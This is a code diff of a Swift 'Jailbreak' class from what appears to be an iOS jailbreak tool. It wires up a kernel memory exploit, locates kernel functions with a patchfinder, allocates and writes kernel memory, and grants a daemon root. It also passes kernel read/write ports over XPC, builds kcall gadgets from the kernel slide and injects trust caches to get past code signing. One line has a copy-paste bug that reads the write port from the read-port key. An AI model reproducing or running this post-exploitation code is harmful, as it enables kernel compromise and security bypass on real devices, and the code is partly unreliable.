@@ -37,14 +37,9 @@ class Jailbreak {
 //    }()
     
     // istantiate in _makeKPF(), so if user tries to rejb (if possible) they don't have to generate this again
-    var currentKPF: KPF? = nil
     var isCurrentlyPostExploit: Bool = false
-    
+        
     func _makeKPF() throws -> KPF {
-        // Load cached KPF if possible
-        if let currentKPF {
-            return currentKPF
-        }
         
         // First: try to see if there is a *decompressed* kernel cache
         // by default, on an unjailbroken device, there isn't one
@@ -58,7 +53,6 @@ class Jailbreak {
            let macho = try? MachO(fromData: data, okToLoadFAT: false),
            let kpf = KPF(kernel: macho) {
             print("successfully loaded decompressed KernelPatch from existing!")
-            self.currentKPF = kpf
             return kpf
         }
         
@@ -66,7 +60,6 @@ class Jailbreak {
         
         // Existing decompressed kcache doens't exist, so, try to decompress the existing one
         let k = try __makeKPFByDecompressingExistingKernelCache()
-        self.currentKPF = k
         return k
     }
     
@@ -96,7 +89,7 @@ class Jailbreak {
             }
         }
         
-        let macho = try MachO(fromData: decompressed, okToLoadFAT: false)
+        let macho = try MachO(fromData: decompressed, okToLoadFAT: true)
         
         guard let kpf = KPF(kernel: macho) else {
             throw StringError("Failed to instantiate KernelPatchFinder from KPF(kernel:) ")
@@ -108,13 +101,31 @@ class Jailbreak {
     // TODO: replace label w jailbreak name once decided
     let queue = DispatchQueue(label: "com.serena.evelynee.jailbreakqueue")
     
+    lazy var kpf: KPF = {
+        if let decomp = try? Data(contentsOf: NSURL.fileURL(withPath: String(Bundle.main.bundleURL.appendingPathComponent("kc.img4").absoluteString.dropFirst(7)))) {
+            let macho = try! MachO(fromData: decomp, okToLoadFAT: false)
+            print(macho)
+            return KPF(kernel: macho)!
+        } else {
+            return try! _makeKPF()
+        }
+    }()
+    
     func _startImpl(puaf_pages: UInt64, puaf_method: UInt64, kread_method: UInt64, kwrite_method: UInt64) throws {
         let kfd = kopen_intermediate(puaf_pages, puaf_method, kread_method, kwrite_method)
         
         print("stage2!"); sleep(1);
         stage2(kfd)
         
+        print(String(format: "0x%02llX", Jailbreak.shared.kpf.mach_vm_allocate_kernel!))
+        
+        mach_vm_allocate_kernel_func = Jailbreak.shared.kpf.mach_vm_allocate_kernel!
+        
         print("test");sleep(1);
+        
+        let allocated = kalloc(0x4000)
+        
+        print(String(format: "kalloc test: %02llX", allocated));
                         
         isCurrentlyPostExploit = true
         
@@ -123,25 +134,9 @@ class Jailbreak {
         //print("syscall filter ret:", set_syscallfilter(kfd, kfd_struct(kfd).pointee.info.kernel.current_proc))
         
         print("make patchfinder")
-                
-        let kpf: KPF
-        
+                        
         try Bootstrapper.remountPrebootPartition(writable: true)
-        
-        if let decomp = try? Data(contentsOf: NSURL.fileURL(withPath: String(Bundle.main.bundleURL.appendingPathComponent("kc.img4").absoluteString.dropFirst(7)))) {
-            let macho = try! MachO(fromData: decomp, okToLoadFAT: false)
-            print(macho)
-            kpf = KPF(kernel: macho)!
-        } else {
-            kpf = try _makeKPF()
-        }
-        
-        if let kalloc = kpf.kalloc_data_external {
-            kalloc_data_extern = kalloc
-        } else {
-            print("no kalloc_data_extern")
-            kalloc_data_extern = 0xFFFFFFF007188AE8 // 6s 15.1 offset
-        }
+        print(try Bootstrapper.locateExistingFakeRoot())
         
         #if false
         print(String(format: "%02X", kckr32(virt: kfd_struct(kfd).pointee.info.kernel.current_proc + 0x10)), String(format: "%02llX", kckr64(virt: kfd_struct(kfd).pointee.info.kernel.current_proc + 0x10))); sleep(1);
@@ -211,6 +206,24 @@ class Jailbreak {
             print("replyDict returned nil.")
         }
         
+        // BEGIN KALLOC TESTS
+        #if false
+        if let pageTest = kalloc_once() {
+            print(pageTest); sleep(1);
+            
+            _kwrite64(kfd, pageTest, 0x4141)
+            let read = _kread64(kfd, pageTest)
+            
+            print("read:", read)
+            
+            if read == 0x4141 {
+                print("SUCCESS ON KALLOC")
+            }
+        } else {
+            print("failed kalloc")
+        }
+        #endif
+        
         // BEGIN KRW HANDOFF
                 
         let jbdProc = proc_of_pid(kfd, jbdPID)
@@ -222,16 +235,19 @@ class Jailbreak {
         if let replyDict = sendJBDMessage(dict2) {
             print(String(cString: xpc_copy_description(replyDict)))
             
-            let port: mach_port_t = UInt32(xpc_dictionary_get_uint64(replyDict, "port"))
+            getRoot(kfd, jbdProc)
             
-            print("jbdPID", jbdPID, "port", port)
+            let kread_port: mach_port_t = UInt32(xpc_dictionary_get_uint64(replyDict, "kread_port"))
+            let kwrite_port: mach_port_t = UInt32(xpc_dictionary_get_uint64(replyDict, "kread_port"))
+
+            print("jbdPID", jbdPID, "port", kread_port, kwrite_port)
             
             print("jbdTask:", String(format: "0x%02llX", jbdTask))
             
-            getRoot(kfd, jbdProc)
-            
-            let fakeClient = init_kcall_remote(kfd, jbdTask, port)
-            kcallread_raw_init(fakeClient, rk32_static_gadget + kernel_slide)
+            let kreadFakeClient = init_kcall_remote(kfd, jbdTask, kread_port)
+            //let kwriteFakeClient = init_kcall_remote(kfd, jbdTask, kwrite_port)
+            kcallread_raw_init(kreadFakeClient, rk32_static_gadget + kernel_slide)
+            //kcallread_raw_init(kwriteFakeClient, wk32_static_gadget + kernel_slide)
             
         } else {
             print("replyDict returned nil.")
@@ -304,7 +320,7 @@ class Jailbreak {
         let pmap_image4_trust_caches: UInt64 = patchFinder.pmap_image4_trust_caches!
         print("so far it's good", String(format: "%02llX", pmap_image4_trust_caches)) // 0xFFFFFFF0078718C0
         
-        var mem: UInt64 = dirty_kalloc(kfd, 1024)
+        var mem: UInt64 = kalloc(0x4000)
         if mem == 0 {
             return print("Failed to allocate kernel memory for TrustCache: \(mem)")
         }
@@ -354,9 +370,6 @@ class Jailbreak {
         let pmap_image4_trust_caches: UInt64 = patchFinder.pmap_image4_trust_caches!
         print("so far it's good", String(format: "%02llX", pmap_image4_trust_caches)) // 0xFFFFFFF0078718C0
         
-        print(String(format: "%02llX", kalloc(kfd, 0x4000)))
-        print(String(format: "%02llX", kalloc(kfd, 0x4000)))
-        print(String(format: "%02llX", kalloc(kfd, 0x4000)))
         var mem: UInt64 = dirty_kalloc(kfd, 0x1000)
         if mem == 0 {
             print("Failed to allocate kernel memory for TrustCache: \(mem)")
